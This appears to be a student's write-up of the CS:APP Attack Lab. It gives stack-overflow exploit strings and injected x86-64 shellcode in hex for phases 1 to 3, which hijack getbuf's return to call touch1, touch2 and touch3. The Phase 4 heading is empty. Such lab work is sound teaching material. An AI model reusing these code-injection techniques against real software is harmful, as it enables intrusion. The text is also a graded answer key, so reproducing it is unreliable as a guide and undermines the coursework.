* Phase 1

The stack space of ~getbuf~ is ~0x28~. The address of ~touch1~ is
~0x4017c0~. Thus, the exploit string should consists of 40 bytes of
random garbage and a 8-byte wide ~0x4017c0~.

The string that used by =hex2raw= to generate the actual input string:

#+begin_example
c0 17 40 00 00 00 00 00
c0 17 40 00 00 00 00 00
c0 17 40 00 00 00 00 00
c0 17 40 00 00 00 00 00
c0 17 40 00 00 00 00 00
c0 17 40 00 00 00 00 00
#+end_example

* Phase 2

In phase 2 we are going to inject the following code into the
program.

#+begin_src asm
          mov $0x59b997fa, %rdi
          mov $0x4017ec, (%rsp)
          ret
#+end_src

To be more specific, the code is injected to the buffer of the ~getbuf~
function. We also have to make ~getbuf~ returns to the starting address
of the buffer, which is =0x5561dc78=.

The final string we feed to =hex2raw= is:

#+begin_example
48 c7 c7 fa 97 b9 59 48 c7 04 24 ec 17 40 00 c3
78 dc 61 55 00 00 00 00
78 dc 61 55 00 00 00 00
78 dc 61 55 00 00 00 00
78 dc 61 55 00 00 00 00
#+end_example

Though this piece of code successfully called ~touch2~, it also
generates a segmentation fault. I think it is because we overwrite the
value where ~%rsp~ is pointing to. Instead of move, let's try ~push~. The
new injected code is:

#+begin_src asm
          mov $0x59b997fa, %rdi
          push $0x4017ec
          ret
#+end_src

The corresponding string that we feed to =hex2raw= is:

#+begin_example
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
00 00 00
78 dc 61 55 00 00 00 00
78 dc 61 55 00 00 00 00
78 dc 61 55 00 00 00 00
78 dc 61 55 00 00 00 00
#+end_example

* Phase 3

Cookie is:

0x59b997fa.

Hex representation is:

35 39 62 39 39 37 66 61

Let's place the string at the beginning of the buffer, thus it is less
likely to be overwritten by other function calls.

The code we need is:

#+begin_src asm
          mov $0x5561dc78, %rdi
          push $0x4018fa
          ret
#+end_src

This does not work. It happens to be written by some stack validation
mechanism. Try offset it a little bit.

Offsetting it makes it more closer to the top of the stack, which
makes it easier to be overwrote. Actually, it gets overwrote by a ~push~
instruction.

Analyzing the assembly code of ~touch3~, ~hexmatch~ tells that the stack
allocated by ~getbuf~ can not be used, they are all overwritten. Thus,
we can only place the string further down the stack. This leads to a
segmentation fault in phase 2. Let's see if it will work in phase 3.

#+begin_example
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
00 00 00
88 dc 61 55 00 00 00 00
88 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
#+end_example

The code works. I guess phase 3 uses a different validation protocol
than phase 2. Note that I have adjusted the address of the string in
the injected code to be =0x5561dca8=.

* Phase 4
